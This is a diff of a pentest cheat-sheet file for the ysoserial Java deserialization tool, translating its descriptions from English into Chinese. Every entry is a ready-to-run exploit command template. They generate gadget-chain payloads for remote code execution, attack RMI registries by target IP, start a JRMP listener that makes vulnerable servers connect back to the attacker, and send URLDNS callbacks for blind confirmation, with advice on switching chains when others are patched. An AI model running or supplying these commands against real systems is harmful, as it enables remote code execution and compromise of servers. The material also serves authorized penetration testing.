@@ -4,62 +4,54 @@ tags: [java, security, exploitation, deserialization, pentest, rce, infrastructu
 # === PAYLOAD GENERATION ===
 
 actions:
- - title: ysoserial - basic payload generation
+ - title: ysoserial - 基础 payload 生成
    desc: |
-     Generates a serialized Java object targeting a specific vulnerable library to execute a system command. 
-     This is the most common usage of the tool, where the output is binary data that must be delivered to a deserialization entry point. 
-     You must know or guess the classpath dependencies of the target application to select the correct gadget chain.
+     生成针对特定易受攻击库的序列化 Java 对象，以执行系统命令。这是该工具最常见的用法，其输出是必须传递到反序列化入口点的二进制数据。
+     你必须了解或猜测目标应用的 classpath 依赖，才能选择正确的 gadget 链。
    command: "java -jar ysoserial.jar {{payload_type|CommonsCollections1}} '{{command|calc.exe}}'"
 
- - title: ysoserial - generate and save to file
+ - title: ysoserial - 生成并保存到文件
    desc: |
-     Generates a malicious serialized object and redirects the binary output into a specific file. 
-     This is essential when the exploit requires uploading a file or sending binary data via tools like curl or Burp Suite. 
-     Always use redirection (>) to ensure the binary integrity of the payload is maintained without console encoding issues.
+     生成恶意序列化对象，并将二进制输出重定向到特定文件。当利用需要通过 curl 或 Burp Suite 等工具上传文件或发送二进制数据时至关重要。
+     始终使用重定向（>）以确保 payload 的二进制完整性，避免控制台编码问题。
    command: "java -jar ysoserial.jar {{payload_type|CommonsCollections1}} '{{command|whoami}}' > {{output_file|payload.bin}}"
 
- - title: ysoserial - dns exfiltration (URLDNS)
+ - title: ysoserial - DNS 外泄（URLDNS）
    desc: |
-     Creates a payload that triggers a DNS lookup to a specified URL upon deserialization. 
-     This payload is extremely useful for "blind" deserialization vulnerabilities because it does not depend on any third-party libraries (it uses standard JDK classes). 
-     It is the primary method for confirming a vulnerability exists before attempting a more complex RCE gadget chain.
+     创建在反序列化时触发对指定 URL 进行 DNS 查询的 payload。此 payload 对“盲”反序列化漏洞极为有用，因为它不依赖任何第三方库（使用标准 JDK 类）。
+     在尝试更复杂的 RCE gadget 链之前，它是确认漏洞存在的主要方法。
    command: "java -jar ysoserial.jar URLDNS \"{{dns_callback_url}}\""
 
 # === EXPLOIT MODULES ===
 
- - title: ysoserial - exploit RMI registry
+ - title: ysoserial - 利用 RMI 注册表
    desc: |
-     Executes a direct attack against a remote RMI Registry service. 
-     The exploit attempts to bind a malicious object into the registry, which triggers deserialization on the server side. 
-     This requires the target port (default 1099) to be accessible and the server to have vulnerable libraries in its classpath.
+     对远程 RMI Registry 服务执行直接攻击。该利用尝试将恶意对象绑定到注册表中，从而在服务器端触发反序列化。
+     这需要目标端口（默认 1099）可访问，且服务器 classpath 中有易受攻击的库。
    command: "java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit {{target_ip}} {{target_port|1099}} {{payload_type|CommonsCollections1}} '{{command|calc.exe}}'"
 
- - title: ysoserial - start JRMP listener
+ - title: ysoserial - 启动 JRMP 监听器
    desc: |
-     Starts a local JRMP (Java Remote Method Protocol) server that delivers a payload to any connecting client. 
-     This is used for "inbound" attacks where a vulnerable server is forced to connect back to the attacker (e.g., using a JRMPClient gadget). 
-     The attacker-controlled listener will then send the actual RCE payload (like CommonsCollections) to the target upon connection.
+     启动本地 JRMP（Java 远程方法协议）服务器，向任何连接客户端传递 payload。这用于“入站”攻击，即迫使易受攻击的服务器连接回攻击者（如使用 JRMPClient gadget）。
+     攻击者控制的监听器随后在连接时向目标发送实际的 RCE payload（如 CommonsCollections）。
    command: "java -cp ysoserial.jar ysoserial.exploit.JRMPListener {{listening_port|1099}} {{payload_type|CommonsCollections1}} '{{command|calc.exe}}'"
 
 # === COMMON GADGET CHAINS ===
 
- - title: ysoserial - groovy library exploit
+ - title: ysoserial - Groovy 库利用
    desc: |
-     Generates an exploit payload specifically for applications that include the Groovy runtime library. 
-     Groovy is a common dependency in modern Java applications and provides a reliable path to remote code execution. 
-     This gadget is often a good alternative when the more common Apache Commons Collections chains are patched.
+     专门为包含 Groovy 运行时库的应用生成利用 payload。Groovy 是现代 Java 应用中的常见依赖，提供可靠的远程代码执行路径。
+     当更常见的 Apache Commons Collections 链被修补时，此 gadget 通常是很好的替代选择。
    command: "java -jar ysoserial.jar Groovy1 '{{command|touch /tmp/pwned}}'"
 
- - title: ysoserial - common beansutils exploit
+ - title: ysoserial - Commons BeanUtils 利用
    desc: |
-     Targets applications utilizing the Apache Commons BeanUtils library for property manipulation. 
-     This gadget chain is effective against many enterprise Java applications that use BeanUtils for data mapping. 
-     It is particularly useful when the environment has strict classloader restrictions that block other gadget chains.
+     针对利用 Apache Commons BeanUtils 库进行属性操作的应用。此 gadget 链对许多使用 BeanUtils 进行数据映射的企业 Java 应用有效。
+     当环境具有阻止其他 gadget 链的严格类加载器限制时特别有用。
    command: "java -jar ysoserial.jar CommonsBeanutils1 '{{command|whoami}}'"
 
- - title: ysoserial - spring framework exploit
+ - title: ysoserial - Spring 框架利用
    desc: |
-     Targets the Spring Framework, one of the most widely used Java application frameworks. 
-     This payload utilizes classes within the Spring Core and Spring Beans modules to achieve code execution. 
-     It is highly effective against Spring-based microservices that expose deserialization endpoints.
+     针对使用最广泛的 Java 应用框架之一 Spring Framework。此 payload 利用 Spring Core 和 Spring Beans 模块中的类实现代码执行。
+     它对暴露反序列化端点的基于 Spring 的微服务非常有效。
    command: "java -jar ysoserial.jar Spring1 '{{command|sleep 10}}'"
